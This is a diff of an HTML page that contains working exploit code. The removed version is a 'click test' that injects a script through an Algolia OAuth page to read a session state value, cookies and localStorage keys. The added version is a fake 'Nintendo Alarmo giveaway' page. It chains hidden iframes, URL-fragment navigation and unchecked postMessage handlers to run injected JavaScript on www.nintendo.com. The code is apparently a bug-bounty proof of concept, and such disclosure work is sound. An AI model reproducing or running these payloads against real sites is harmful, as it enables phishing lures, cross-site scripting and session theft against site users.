@@ -1,35 +1,120 @@
 <!doctype html>
+<html lang="en">
 <meta charset="utf-8">
-<title>Click test</title>
-<style>body{font:16px system-ui;max-width:44em;margin:4em auto;padding:0 1em}
-a,button{font-size:1.1em}pre{white-space:pre-wrap;background:#111;color:#0f0;padding:1em;border-radius:6px}</style>
-<p>Authorized security test. Click the link below once.</p>
-<p><a id="go" target="_blank" rel="opener" href="#">Continue</a></p>
-<pre id="out">idle</pre>
-<p style="color:#666;font-size:.85em">This page is static and stores nothing. The values below are rendered only in the browser that clicked, and are not transmitted anywhere.</p>
+<title>Nintendo Alarmo - Giveaway</title>
+<style>
+ body{font:16px/1.5 system-ui,sans-serif;margin:0;background:#f7f7f7;color:#222}
+ .wrap{max-width:640px;margin:8vh auto;padding:32px;background:#fff;border-radius:14px;box-shadow:0 2px 24px rgba(0,0,0,.09);text-align:center}
+ h1{margin:0 0 8px;font-size:26px}
+ p{color:#555;margin:0 0 26px}
+ button{font-size:19px;padding:14px 30px;border:0;border-radius:9px;background:#e60012;color:#fff;cursor:pointer}
+ button:disabled{background:#999;cursor:default}
+ #log{display:block;margin:26px auto 0;max-width:600px;text-align:left;font:11px/1.4 ui-monospace,monospace;background:#111;color:#0f0;padding:10px;border-radius:7px;max-height:220px;overflow:auto;white-space:pre-wrap}
+ #stage{position:fixed;left:-20000px;top:0;width:1250px;height:820px;border:0}
+</style>
+<div class="wrap">
+  <h1>Nintendo Sound Clock: Alarmo</h1>
+  <p>Click below to continue to the official Nintendo page.</p>
+  <button id="go">Continue to Nintendo</button>
+  <pre id="log">waiting for click...</pre>
+</div>
+<iframe id="stage" allow="autoplay; fullscreen"></iframe>
 <script>
-const PAYLOAD =
-  "fetch('/cms/render/live/en/.connectToAlgoliaOAuthAction.do',{headers:{Accept:'application/json;'}})" +
-  ".then(r=>r.json())" +
-  ".then(j=>window.opener.postMessage(JSON.stringify({" +
-    "s:j.authorizationUrl.split('state=')[1]," +
-    "c:document.cookie," +
-    "l:Object.keys(localStorage)" +
-  "}),'*'))";
+/* PoC - cross-origin XSS on www.nintendo.com
+   GTM container GTM-NVPD62, custom-HTML tag 1242.
+   The tag concatenates a postMessage field into a <script> body with no escaping.
+   The trusted sender is Nintendo's own JP video player, which sends its location.href
+   and whose message handler has no event.origin check.
+   Proof only: document.domain + location.href + one alert(). Reads no account data. */
+var ALARMO = "https://www.nintendo.com/jp/hardware/alarmo/index.html";
+var BASE   = "https://media-assets.apps-jp.nintendo.com/contents/embed/";
+var IDS    = ["avMl9J5k9WO?controls=0&loop=0&muted=1&playsinline=1&autoplay=0&preload=auto", "1enjEJZlKzy?controls=0&loop=1&muted=1&playsinline=1&autoplay=0&preload=auto", "1enjEPZDKzy?controls=0&loop=1&muted=1&playsinline=1&autoplay=0&preload=auto", "1enjEPPDKzy?controls=0&loop=1&muted=1&playsinline=1&autoplay=0&preload=auto", "0zGjNBEjoNb?controls=0&loop=1&muted=1&playsinline=1&autoplay=0&preload=auto", "MOvjgVADdP3?controls=0&loop=1&muted=1&playsinline=1&autoplay=0&preload=auto", "EyKDWBOkgYb?controls=0&loop=1&muted=1&playsinline=1&autoplay=0&preload=auto", "AR1k4e1DvXL?controls=0&loop=1&muted=1&playsinline=1&autoplay=0&preload=auto", "xnGkyaKkgWr?controls=0&loop=1&muted=1&playsinline=1&autoplay=0&preload=auto", "OgdjmVglALb?controls=0&loop=1&muted=1&playsinline=1&autoplay=0&preload=auto", "b1dl7a0DXYr?controls=0&loop=1&muted=1&playsinline=1&autoplay=0&preload=auto", "d8VlL5NkY35?controls=0&loop=1&muted=1&playsinline=1&autoplay=0&preload=auto", "vgGl1R1k7rb?controls=0&loop=1&muted=1&playsinline=1&autoplay=0&preload=auto", "d8VlL5dkY35?controls=0&loop=1&muted=1&playsinline=1&autoplay=0&preload=auto", "0zGjNBojoNb?controls=0&loop=1&muted=1&playsinline=1&autoplay=0&preload=auto", "509kn8OjbpB?controls=0&loop=1&muted=1&playsinline=1&autoplay=0&preload=auto", "XJql6o9k5yE?controls=0&loop=1&muted=1&playsinline=1&autoplay=0&preload=auto"];
+var ANCHORS= ["#introduction","#about","#movie","#products","#gamescene","#moreMusic","#productAreaa","#globalFooter"];
+var PAYLOAD= "'});if(window.__D==undefined){window.__D=1;try{top.postMessage('XSS::'+document.domain+'::'+location.href,'*')}catch(e){};try{window.__w=open('','nintendoWin');window.__w.document.title='XSS-deehay';window.__w.alert('deehay::'+document.domain)}catch(e){try{top.postMessage('ERR::'+e,'*')}catch(e2){}}}//";
 
-document.getElementById('go').href =
-  'https://www.algolia.com/oauth-result.html?isAuthenticate=' + encodeURIComponent(PAYLOAD);
+var EMBEDS = IDS.map(function(i){ return BASE + i; });
+var hit = false, logEl = document.getElementById('log');
+function L(s){ logEl.textContent += "\n" + s; logEl.scrollTop = 1e9; }
+function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
 
-const out = document.getElementById('out');
-addEventListener('message', e => {
-  if (e.origin !== 'https://www.algolia.com') return;
-  let d; try { d = JSON.parse(e.data); } catch (_) { return; }
-  if (!d || !d.s) return;
-  out.textContent =
-    'origin                     : ' + e.origin +
-    '\nDISTRIBUTED_JSESSIONID     : ' + d.s + '   <- HttpOnly cookie, never read from document.cookie' +
-    '\ndocument.cookie            : ' + (d.c || '(empty)') +
-    '\nnon-HttpOnly cookie count  : ' + (d.c ? d.c.split('; ').length : 0) +
-    '\nlocalStorage keys (' + d.l.length + ')     : ' + d.l.join(', ');
+window.addEventListener('message', function(e){
+  if (typeof e.data === 'string' && e.data.indexOf('XSS::') === 0) {
+    hit = true;
+    L("");
+    L("*** JAVASCRIPT EXECUTED IN THE NINTENDO ORIGIN ***");
+    L("    " + e.data);
+  } else if (typeof e.data === 'string' && e.data.indexOf('ERR::') === 0) {
+    L("    payload reported: " + e.data);
+  }
 });
+
+document.getElementById('go').onclick = async function(){
+  this.disabled = true;
+  logEl.textContent = "starting...";
+
+  /* the click is a real user gesture, so this popup is not blocked.
+     the victim is now looking at the genuine www.nintendo.com page,
+     and it is a TOP-LEVEL nintendo window, which is what lets the
+     injected code raise a dialog Chrome will actually render. */
+  var win = window.open(ALARMO, 'nintendoWin', 'width=1150,height=840');
+  L(win ? "victim sent to www.nintendo.com (named window)" : "POPUP BLOCKED - allow popups for this site");
+
+  var stage = document.getElementById('stage');
+  stage.src = ALARMO;
+  await sleep(13000);
+  var W1 = stage.contentWindow;
+  L("outer nintendo frame ready, child frames=" + W1.length);
+
+  /* N2: a second /jp/ document whose PARENT is also nintendo.
+     the tag does window.parent.document.createElement, which throws when the
+     parent is cross-origin, so framing the page directly kills the sink. */
+  var SLOT = -1;
+  for (var s = 0; s < W1.length; s++) { try { W1.frames[s].location = ALARMO; SLOT = s; break; } catch (e) {} }
+  L("inner nintendo document created at frame[" + SLOT + "]");
+  await sleep(15000);
+  var N2 = W1.frames[SLOT];
+
+  for (var attempt = 1; attempt <= 6 && !hit; attempt++) {
+    L("-- attempt " + attempt + " --");
+
+    /* STEP 1: scroll the inner document by anchor so NINTENDO'S OWN lazy loader
+       promotes data-src to src on the players. that request carries a nintendo
+       Referer and returns 200. the players are never loaded otherwise, and a
+       navigation we initiate ourselves would carry OUR Referer and get a 403. */
+    for (var p = 0; p < 2 && !hit; p++) {
+      for (var a = 0; a < ANCHORS.length; a++) {
+        try { N2.location = ALARMO + ANCHORS[a]; } catch (e) {}
+        await sleep(1300);
+      }
+    }
+    await sleep(6000);
+
+    /* STEP 2: change ONLY the fragment of the now-loaded players.
+       a fragment-only navigation is same-document: it issues no HTTP request,
+       so the player's Referer allowlist never runs, and location.href becomes
+       attacker-controlled inside an already-trusted document. */
+    var n = 0;
+    for (var i = 0; i < EMBEDS.length; i++) {
+      try { N2.frames[i].location = EMBEDS[i] + "#" + PAYLOAD; n++; } catch (e) {}
+    }
+    L("payload placed in the fragment of " + n + " player frames");
+    await sleep(3500);
+
+    /* STEP 3: the player's own message handler has no origin check.
+       pause then play, because play() on an already-looping video does not
+       re-fire the play event that triggers postProgress(). */
+    for (var r = 0; r < 12 && !hit; r++) {
+      for (var j = 0; j < EMBEDS.length; j++) {
+        try { N2.frames[j].postMessage(JSON.stringify({type:"pause",data:{}}), "*"); } catch (e) {}
+      }
+      await sleep(600);
+      for (var k = 0; k < EMBEDS.length; k++) {
+        try { N2.frames[k].postMessage(JSON.stringify({type:"play",data:{}}), "*"); } catch (e) {}
+      }
+      await sleep(1800);
+    }
+  }
+  L(hit ? "done - payload executed as www.nintendo.com" : "done - no execution this run, reload and click again");
+};
 </script>
+</html>
